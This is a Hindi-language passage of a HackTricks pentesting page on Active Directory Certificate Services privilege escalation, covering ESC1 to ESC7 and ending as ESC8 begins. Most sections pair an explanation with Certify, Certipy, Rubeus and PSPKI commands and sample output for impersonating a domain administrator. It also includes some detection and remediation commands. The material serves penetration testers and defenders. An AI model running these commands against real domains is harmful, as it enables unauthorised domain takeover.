# AD CS डोमेन एस्केलेशन

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) में **शामिल हों** या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## गलत कॉन्फ़िगर सर्टिफिकेट टेम्प्लेट्स - ESC1

### व्याख्या

* **Enterprise CA** **निम्न-विशेषाधिकार वाले उपयोगकर्ताओं को नामांकन अधिकार प्रदान करता है**
* **मैनेजर अप्रूवल अक्षम है**
* **कोई अधिकृत हस्ताक्षर आवश्यक नहीं हैं**
* एक अत्यधिक अनुमति वाला **सर्टिफिकेट टेम्प्लेट** सुरक्षा विवरण **निम्न-विशेषाधिकार वाले उपयोगकर्ताओं को सर्टिफिकेट नामांकन अधिकार प्रदान करता है**
* **सर्टिफिकेट टेम्प्लेट EKUs को परिभाषित करता है जो प्रमाणीकरण को सक्षम करते हैं**:
* _Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), या कोई EKU नहीं (SubCA)._
* **सर्टिफिकेट टेम्प्लेट CSR में एक subjectAltName निर्दिष्ट करने के लिए अनुरोधकर्ताओं की अनुमति देता है:**
* **AD** एक सर्टिफिकेट के **subjectAltName** (SAN) फ़ील्ड द्वारा निर्दिष्ट पहचान का **उपयोग करेगा** यदि वह **मौजूद है**. नतीजतन, यदि एक अनुरोधकर्ता CSR में SAN निर्दिष्ट कर सकता है, तो अनुरोधकर्ता **किसी के रूप में भी सर्टिफिकेट का अनुरोध कर सकता है** (उदाहरण के लिए, एक डोमेन एडमिन उपयोगकर्ता). सर्टिफिकेट टेम्प्लेट का AD ऑब्जेक्ट **निर्दिष्ट करता है** कि अनुरोधकर्ता **SAN को CSR में निर्दिष्ट कर सकता है** या नहीं, इसके **`mspki-certificate-name-`**`flag` प्रॉपर्टी में. `mspki-certificate-name-flag` प्रॉपर्टी एक **बिटमास्क** है और यदि **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** फ्लैग **मौजूद है**, तो **अनुरोधकर्ता SAN को निर्दिष्ट कर सकता है.**

{% hint style="danger" %}
ये सेटिंग्स एक **निम्न-विशेषाधिकार वाले उपयोगकर्ता को मनमाने SAN के साथ एक सर्टिफिकेट का अनुरोध करने की अनुमति देती हैं**, जिससे निम्न-विशेषाधिकार वाला उपयोगकर्ता Kerberos या SChannel के माध्यम से डोमेन में किसी भी प्रिंसिपल के रूप में प्रमाणीकरण कर सकता है.
{% endhint %}

यह अक्सर सक्षम किया जाता है, उदाहरण के लिए, उत्पादों या तैनाती सेवाओं को HTTPS सर्टिफिकेट्स या होस्ट सर्टिफिकेट्स को तुरंत उत्पन्न करने की अनुमति देने के लिए. या ज्ञान की कमी के कारण.

ध्यान दें कि जब इस अंतिम विकल्प के साथ एक सर्टिफिकेट बनाया जाता है तो एक **चेतावनी दिखाई देती है**, लेकिन यह नहीं दिखाई देती है यदि इस कॉन्फ़िगरेशन के साथ एक **सर्टिफिकेट टेम्प्लेट** को **डुप्लिकेट** किया जाता है (जैसे कि `WebServer` टेम्प्लेट जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है और फिर एडमिन एक प्रमाणीकरण OID जोड़ सकता है).

### दुरुपयोग

**कमजोर सर्टिफिकेट टेम्प्लेट्स को खोजने के लिए** आप चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
**इस कमजोरी का दुरुपयोग करके एक प्रशासक की नकल करने के लिए** कोई चला सकता है:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
तब आप उत्पन्न **प्रमाणपत्र को `.pfx`** प्रारूप में परिवर्तित कर सकते हैं और इसे **Rubeus या certipy का उपयोग करके पुनः प्रमाणीकरण के लिए उपयोग कर सकते हैं**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows बाइनरीज़ "Certreq.exe" और "Certutil.exe" का उपयोग PFX उत्पन्न करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

इसके अलावा, निम्न LDAP क्वेरी जब AD Forest के कॉन्फ़िगरेशन स्कीमा के खिलाफ चलाई जाती है, तो इसका उपयोग **प्रमाणपत्र टेम्प्लेट्स को गिनने** के लिए किया जा सकता है जिन्हें **अनुमोदन/हस्ताक्षर की आवश्यकता नहीं होती**, जिनमें **Client Authentication या Smart Card Logon EKU** होता है, और जिनमें **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** फ्लैग सक्षम होता है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## गलत कॉन्फ़िगर किए गए सर्टिफिकेट टेम्प्लेट्स - ESC2

### व्याख्या

दूसरी दुरुपयोग परिदृश्य पहले का एक विविधता है:

1. एंटरप्राइज CA कम-विशेषाधिकार वाले उपयोगकर्ताओं को नामांकन अधिकार प्रदान करता है।
2. मैनेजर अनुमोदन अक्षम है।
3. कोई अधिकृत हस्ताक्षर आवश्यक नहीं हैं।
4. एक अत्यधिक अनुमति वाला सर्टिफिकेट टेम्प्लेट सुरक्षा विवरण कम-विशेषाधिकार वाले उपयोगकर्ताओं को सर्टिफिकेट नामांकन अधिकार प्रदान करता है।
5. **सर्टिफिकेट टेम्प्लेट किसी भी उद्देश्य EKU को परिभाषित करता है या कोई EKU नहीं।**

**किसी भी उद्देश्य EKU** एक हमलावर को **किसी भी उद्देश्य** के लिए **सर्टिफिकेट** प्राप्त करने की अनुमति देता है जैसे कि क्लाइंट प्रमाणीकरण, सर्वर प्रमाणीकरण, कोड हस्ताक्षर, आदि। ESC3 के लिए उपयोग की गई **वही तकनीक** इसका दुरुपयोग करने के लिए उपयोग की जा सकती है।

**कोई EKUs के बिना सर्टिफिकेट** — एक अधीनस्थ CA सर्टिफिकेट — किसी भी उद्देश्य के लिए दुरुपयोग किया जा सकता है लेकिन **नए सर्टिफिकेट्स को हस्ताक्षर करने के लिए भी उपयोग किया जा सकता है**। इस प्रकार, एक अधीनस्थ CA सर्टिफिकेट का उपयोग करके, एक हमलावर **नए सर्टिफिकेट्स में मनमाने EKUs या फील्ड्स को निर्दिष्ट कर सकता है।**

हालांकि, अगर **अधीनस्थ CA** **`NTAuthCertificates`** ऑब्जेक्ट द्वारा विश्वसनीय नहीं है (जो डिफ़ॉल्ट रूप से नहीं होगा), हमलावर **डोमेन प्रमाणीकरण** के लिए काम करने वाले **नए सर्टिफिकेट्स नहीं बना सकता**। फिर भी, हमलावर किसी भी EKU के साथ **नए सर्टिफिकेट्स बना सकता है** और मनमाने सर्टिफिकेट मूल्यों के साथ, जिनका **बहुत** दुरुपयोग हो सकता है (जैसे कोड हस्ताक्षर, सर्वर प्रमाणीकरण, आदि) और नेटवर्क में अन्य एप्लिकेशनों के लिए बड़े प्रभाव हो सकते हैं जैसे कि SAML, AD FS, या IPSec।

निम्न LDAP क्वेरी जब AD फ़ॉरेस्ट के कॉन्फ़िगरेशन स्कीमा के खिलाफ चलाई जाती है, तो इस परिदृश्य से मेल खाने वाले टेम्प्लेट्स को सूचीबद्ध करने के लिए उपयोग की जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## गलत कॉन्फ़िगर किए गए एनरोलमेंट एजेंट टेम्प्लेट्स - ESC3

### व्याख्या

यह परिदृश्य पहले और दूसरे जैसा है लेकिन **दुरुपयोग** करता है **एक अलग EKU** (Certificate Request Agent) और **2 अलग टेम्प्लेट्स** (इसलिए इसमें 2 सेट आवश्यकताएँ हैं),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft दस्तावेज़ीकरण में **Enrollment Agent** के रूप में जाना जाता है, एक सिद्धांत को अनुमति देता है **दूसरे उपयोगकर्ता की ओर से एक प्रमाणपत्र के लिए एनरोल करने के लिए**.

**“एनरोलमेंट एजेंट”** ऐसे **टेम्प्लेट** में एनरोल होता है और परिणामी **प्रमाणपत्र का उपयोग दूसरे उपयोगकर्ता की ओर से CSR को सह-हस्ताक्षर करने के लिए करता है**. फिर यह **सह-हस्ताक्षरित CSR** को CA को **भेजता है**, एक **टेम्प्लेट** में एनरोल होता है जो **“दूसरे की ओर से एनरोल करने की अनुमति देता है”**, और CA एक **प्रमाणपत्र के साथ प्रतिक्रिया करता है जो “दूसरे” उपयोगकर्ता का होता है**.

**आवश्यकताएँ 1:**

1. Enterprise CA कम-विशेषाधिकार वाले उपयोगकर्ताओं को एनरोलमेंट अधिकार देता है.
2. मैनेजर अनुमोदन अक्षम है.
3. कोई अधिकृत हस्ताक्षर आवश्यक नहीं हैं.
4. एक अत्यधिक अनुमति वाला प्रमाणपत्र टेम्प्लेट सुरक्षा विवरण कम-विशेषाधिकार वाले उपयोगकर्ताओं को प्रमाणपत्र एनरोलमेंट अधिकार देता है.
5. **प्रमाणपत्र टेम्प्लेट Certificate Request Agent EKU को परिभाषित करता है**. Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) दूसरे सिद्धांतों की ओर से अन्य प्रमाणपत्र टेम्प्लेट्स के लिए अनुरोध करने की अनुमति देता है.

**आवश्यकताएँ 2:**

1. Enterprise CA कम-विशेषाधिकार वाले उपयोगकर्ताओं को एनरोलमेंट अधिकार देता है.
2. मैनेजर अनुमोदन अक्षम है.
3. **टेम्प्लेट स्कीमा संस्करण 1 है या 2 से अधिक है और एक Application Policy Issuance Requirement को निर्दिष्ट करता है जिसमें Certificate Request Agent EKU की आवश्यकता होती है.**
4. प्रमाणपत्र टेम्प्लेट एक EKU को परिभाषित करता है जो डोमेन प्रमाणीकरण के लिए अनुमति देता है.
5. CA पर Enrollment agent प्रतिबंध लागू नहीं किए गए हैं.

### दुरुपयोग

आप इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
एंटरप्राइज़ सीए उन **उपयोगकर्ताओं** को **सीमित** कर सकते हैं जो **एनरोलमेंट एजेंट प्रमाणपत्र** प्राप्त कर सकते हैं, एजेंट्स किन टेम्प्लेट्स में एनरोल हो सकते हैं, और किन **खातों** की ओर से एनरोलमेंट एजेंट **कार्य कर सकता है** यह `certsrc.msc` `snap-in -> दायाँ क्लिक करके सीए पर -> Properties पर क्लिक करके -> “Enrollment Agents” टैब पर नेविगेट करके` सेट कर सकते हैं।

हालांकि, सीए की **डिफ़ॉल्ट** सेटिंग है “**एनरोलमेंट एजेंट्स को सीमित न करें**”. जब प्रशासक “एनरोलमेंट एजेंट्स को सीमित करें” को सक्षम करते हैं, तब भी डिफ़ॉल्ट सेटिंग बहुत अधिक अनुमति देने वाली होती है, जो सभी को सभी टेम्प्लेट्स में किसी के रूप में एनरोल करने की अनुमति देती है।

## संवेदनशील प्रमाणपत्र टेम्प्लेट एक्सेस कंट्रोल - ESC4

### **व्याख्या**

**प्रमाणपत्र टेम्प्लेट्स** में एक **सुरक्षा विवरणक** होता है जो यह निर्दिष्ट करता है कि कौन से AD **प्रिंसिपल्स** के पास टेम्प्लेट पर विशिष्ट **अनुमतियां** हैं।

यदि एक **हमलावर** के पास पर्याप्त **अनुमतियां** हैं तो वह एक **टेम्प्लेट** को **संशोधित** कर सकता है और **पिछले खंडों** से किसी भी शोषण योग्य **गलत कॉन्फ़िगरेशन** को **बना** सकता है, वह इसका शोषण कर सकता है और **अधिकारों का विस्तार** कर सकता है।

प्रमाणपत्र टेम्प्लेट्स पर दिलचस्प अधिकार:

* **Owner:** ऑब्जेक्ट पर निहित पूर्ण नियंत्रण, किसी भी गुणधर्म को संपादित कर सकते हैं।
* **FullControl:** ऑब्जेक्ट पर पूर्ण नियंत्रण, किसी भी गुणधर्म को संपादित कर सकते हैं।
* **WriteOwner:** हमलावर-नियंत्रित प्रिंसिपल को मालिक को संशोधित कर सकते हैं।
* **WriteDacl:** एक्सेस कंट्रोल को संशोधित करके हमलावर को FullControl प्रदान कर सकते हैं।
* **WriteProperty:** किसी भी गुणधर्म को संपादित कर सकते हैं

### दुरुपयोग

पिछले जैसे एक privesc का उदाहरण:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब एक उपयोगकर्ता के पास प्रमाणपत्र टेम्प्लेट पर लिखने की अनुमतियां होती हैं। इसे उदाहरण के लिए ESC1 के लिए संवेदनशील बनाने के लिए प्रमाणपत्र टेम्प्लेट की कॉन्फ़िगरेशन को ओवरराइट करने के लिए दुरुपयोग किया जा सकता है।

जैसा कि हम ऊपर के पथ में देख सकते हैं, केवल `JOHNPC` के पास ये अनुमतियां हैं, लेकिन हमारे उपयोगकर्ता `JOHN` के पास `JOHNPC` के लिए नया `AddKeyCredentialLink` एज है। चूंकि यह तकनीक प्रमाणपत्रों से संबंधित है, मैंने इस हमले को भी लागू किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के रूप में जाना जाता है। यहाँ पीड़ित के NT हैश को पुनः प्राप्त करने के लिए Certipy के `shadow auto` कमांड की एक छोटी झलक है।

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy** एकल कमांड के साथ प्रमाणपत्र टेम्प्लेट की कॉन्फ़िगरेशन को ओवरराइट कर सकता है। **डिफ़ॉल्ट** रूप से, Certipy कॉन्फ़िगरेशन को ESC1 के लिए संवेदनशील बनाने के लिए **ओवरराइट** करेगा। हम **`-save-old` पैरामीटर को भी निर्दिष्ट कर सकते हैं ताकि पुरानी कॉन्फ़िगरेशन को सहेजा जा सके**, जो हमारे हमले के बाद कॉन्फ़िगरेशन को **पुनः स्थापित** करने के लिए उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### व्याख्या

AD CS की सुरक्षा को प्रभावित कर सकने वाले ACL आधारित संबंधों का जाल व्यापक है। कई **ऑब्जेक्ट्स सर्टिफिकेट** टेम्प्लेट्स और सर्टिफिकेट अथॉरिटी के बाहर भी **पूरे AD CS सिस्टम पर सुरक्षा प्रभाव** डाल सकते हैं। इन संभावनाओं में शामिल हैं (लेकिन सीमित नहीं हैं):

* **CA सर्वर का AD कंप्यूटर ऑब्जेक्ट** (उदाहरण के लिए, S4U2Self या S4U2Proxy के माध्यम से समझौता)
* **CA सर्वर का RPC/DCOM सर्वर**
* कोई भी **वंशज AD ऑब्जेक्ट या कंटेनर** `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` में (जैसे, सर्टिफिकेट टेम्प्लेट्स कंटेनर, सर्टिफिकेशन अथॉरिटीज कंटेनर, NTAuthCertificates ऑब्जेक्ट, एनरोलमेंट सर्विसेज कंटेनर, आदि।)

यदि कम-विशेषाधिकार वाला हमलावर इनमें से **किसी पर भी नियंत्रण प्राप्त कर सकता है**, तो हमला शायद **PKI सिस्टम को समझौता कर सकता है**।

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### व्याख्या

एक और समान मुद्दा है, जिसे [**CQure Academy पोस्ट**](https://cqureacademy.com/blog/enhanced-key-usage) में वर्णित किया गया है, जो **`EDITF_ATTRIBUTESUBJECTALTNAME2`** फ्लैग से संबंधित है। जैसा कि Microsoft वर्णन करता है, “**यदि** यह फ्लैग CA पर **सेट** है, तो **कोई भी अनुरोध** (जब सब्जेक्ट Active Directory® से बनाया गया हो) में **उपयोगकर्ता द्वारा परिभाषित मान** **सब्जेक्ट अल्टरनेटिव नाम** में हो सकते हैं।”\
इसका मतलब है कि एक **हमलावर** डोमेन **प्रमाणीकरण** के लिए कॉन्फ़िगर किए गए **किसी भी टेम्प्लेट** में नामांकन कर सकता है जो यह भी **अनुमति देता है कि अविशेषाधिकार वाले** उपयोगकर्ता नामांकन कर सकते हैं (उदाहरण के लिए, डिफ़ॉल्ट यूजर टेम्प्लेट) और **सर्टिफिकेट प्राप्त कर सकते हैं** जो हमें डोमेन एडमिन (या **किसी अन्य सक्रिय उपयोगकर्ता/मशीन**) के रूप में **प्रमाणित करने की अनुमति देता है**।

**नोट**: यहाँ **अल्टरनेटिव नाम** `certreq.exe` के `-attrib "SAN:"` तर्क के माध्यम से CSR में **शामिल किए गए हैं** (अर्थात्, “Name Value Pairs”)। यह ESC1 में **SANs का दुरुपयोग करने की विधि से भिन्न** है क्योंकि यह **खाता जानकारी को सर्टिफिकेट विशेषता में स्टोर करता है बनाम सर्टिफिकेट एक्सटेंशन में**।

### दुरुपयोग

संगठन निम्नलिखित `certutil.exe` कमांड का उपयोग करके **जांच सकते हैं कि सेटिंग सक्षम है या नहीं**:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
नीचे दिया गया है, यह सिर्फ **remote** **registry** का उपयोग करता है, इसलिए निम्नलिखित कमांड भी काम कर सकता है:
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) भी इसकी जांच करते हैं और इस गलत कॉन्फ़िगरेशन का दुरुपयोग करने के लिए इस्तेमाल किए जा सकते हैं:
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
ये सेटिंग्स **सेट** की जा सकती हैं, मान लें कि **डोमेन प्रशासनिक** (या समकक्ष) अधिकार हों, किसी भी सिस्टम से:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
यदि आपको अपने वातावरण में यह सेटिंग मिलती है, तो आप **इस फ्लैग को हटा सकते हैं** इसके साथ:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
मई 2022 के सुरक्षा अपडेट के बाद, नए **प्रमाणपत्रों** में एक **सुरक्षा एक्सटेंशन** होगा जो **अनुरोधकर्ता की `objectSid` संपत्ति** को **सम्मिलित** करेगा। ESC1 के लिए, यह संपत्ति SAN से परिलक्षित होगी, लेकिन **ESC6** के साथ, यह संपत्ति **अनुरोधकर्ता की `objectSid`** को परिलक्षित करती है, और SAN से नहीं।\
इस प्रकार, **ESC6 का दुरुपयोग करने के लिए**, पर्यावरण को **ESC10** (Weak Certificate Mappings) के प्रति **संवेदनशील होना चाहिए**, जहां **SAN को नए सुरक्षा एक्सटेंशन पर प्राथमिकता दी जाती है**।
{% endhint %}

## संवेदनशील प्रमाणपत्र प्राधिकरण एक्सेस नियंत्रण - ESC7

### हमला 1

#### व्याख्या

एक प्रमाणपत्र प्राधिकरण स्वयं विभिन्न **CA क्रियाओं** को सुरक्षित करने वाले **अनुमतियों का एक समूह** रखता है। इन अनुमतियों को `certsrv.msc` से एक्सेस किया जा सकता है, CA पर राइट क्लिक करके, प्रॉपर्टीज का चयन करके, और सिक्योरिटी टैब पर स्विच करके:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

इसे [**PSPKI के मॉड्यूल**](https://www.pkisolutions.com/tools/pspki/) के साथ `Get-CertificationAuthority | Get-CertificationAuthorityAcl` का उपयोग करके भी गणना की जा सकती है:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
#### दुरुपयोग

यदि आपके पास **`ManageCA`** अधिकारों वाला एक प्रिंसिपल है जो **प्रमाणपत्र प्राधिकरण** पर है, तो हम **PSPKI** का उपयोग करके दूरस्थ रूप से **`EDITF_ATTRIBUTESUBJECTALTNAME2`** बिट को **SAN** निर्दिष्टीकरण की अनुमति देने के लिए पलट सकते हैं ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

यह [**PSPKI के Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) cmdlet के साथ एक सरल रूप में भी संभव है।

**`ManageCertificates`** अधिकार "CA प्रमाणपत्र प्रबंधक अनुमोदन" सुरक्षा को दरकिनार करके **लंबित अनुरोध को मंजूरी देने** की अनुमति देता है।

आप **Certify** और **PSPKI** मॉड्यूल का **संयोजन** करके एक प्रमाणपत्र का अनुरोध कर सकते हैं, इसे मंजूरी दे सकते हैं, और इसे डाउनलोड कर सकते हैं:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### हमला 2

#### व्याख्या

{% hint style="warning" %}
**पिछले हमले** में **`Manage CA`** अनुमतियों का उपयोग करके **EDITF\_ATTRIBUTESUBJECTALTNAME2** फ्लैग को **सक्षम** किया गया था ताकि **ESC6 हमला** किया जा सके, लेकिन जब तक CA सेवा (`CertSvc`) को पुनः आरंभ नहीं किया जाता, तब तक इसका कोई प्रभाव नहीं होगा। जब किसी उपयोगकर्ता के पास `Manage CA` अधिकार होता है, तो उसे **सेवा को पुनः आरंभ करने की अनुमति** भी होती है। हालांकि, इसका यह **मतलब नहीं है कि उपयोगकर्ता सेवा को दूरस्थ रूप से पुनः आरंभ कर सकता है**। इसके अलावा, **ESC6 अधिकांश पैच किए गए वातावरणों में तुरंत काम नहीं कर सकता** क्योंकि मई 2022 के सुरक्षा अपडेट के कारण।
{% endhint %}

इसलिए, यहाँ एक और हमला प्रस्तुत किया गया है।

पूर्व शर्तें:

* केवल **`ManageCA` अनुमति**
* **`Manage Certificates`** अनुमति (जो **`ManageCA`** से प्रदान की जा सकती है)
* प्रमाणपत्र टेम्पलेट **`SubCA`** को **सक्षम** होना चाहिए (जिसे **`ManageCA`** से सक्षम किया जा सकता है)

यह तकनीक इस तथ्य पर निर्भर करती है कि `Manage CA` _और_ `Manage Certificates` अधिकार वाले उपयोगकर्ता **असफल प्रमाणपत्र अनुरोधों को जारी कर सकते हैं**। **`SubCA`** प्रमाणपत्र टेम्पलेट **ESC1 के लिए संवेदनशील है**, लेकिन **केवल प्रशासक** ही टेम्पलेट में नामांकन कर सकते हैं। इस प्रकार, एक **उपयोगकर्ता** **`SubCA`** में नामांकन के लिए **अनुरोध कर सकता है** - जिसे **अस्वीकार कर दिया जाएगा** - लेकिन **फिर प्रबंधक द्वारा बाद में जारी किया जाएगा**।

#### दुरुपयोग

आप अपने उपयोगकर्ता को एक नए अधिकारी के रूप में जोड़कर **खुद को `Manage Certificates`** अधिकार प्रदान कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** टेम्पलेट को CA पर `-enable-template` पैरामीटर के साथ **सक्षम किया जा सकता है**। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्षम होता है।
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस हमले के लिए आवश्यक शर्तें पूरी कर ली हैं, तो हम **`SubCA` टेम्प्लेट के आधार पर एक प्रमाणपत्र की मांग करना शुरू कर सकते हैं**।

**यह अनुरोध अस्वीकार कर दिया जाएगा**, लेकिन हम प्राइवेट की को सहेज लेंगे और अनुरोध ID को नोट कर लेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
हमारे **`Manage CA` और `Manage Certificates`** के साथ, हम फिर **असफल प्रमाणपत्र अनुरोध को जारी कर सकते हैं** `ca` कमांड के साथ और `-issue-request <request ID>` पैरामीटर के साथ।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर के साथ **जारी किए गए प्रमाणपत्र को प्राप्त कर सकते हैं**।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### व्याख्या

{% hint style="info" %}
संक्षेप में, यदि किसी वातावरण में **AD CS स्थापित** है, एक **कमजोर वेब नामांकन अंतरापृष्ठ** के साथ और कम से कम एक **प्रकाशित प्रमाणपत्र टेम्पलेट** जो **डोमेन कंप्यूटर नामांकन और ग्राहक प्रमाणीकरण** की अनुमति देता है (जैसे कि डिफ़ॉल्ट **`Machine`** टेम्पलेट), तो एक **हमलावर किसी भी कंप्यूटर को समझौता कर सकता है जिसमें स्पूलर सेवा चल रही हो**!
{% endhint %}

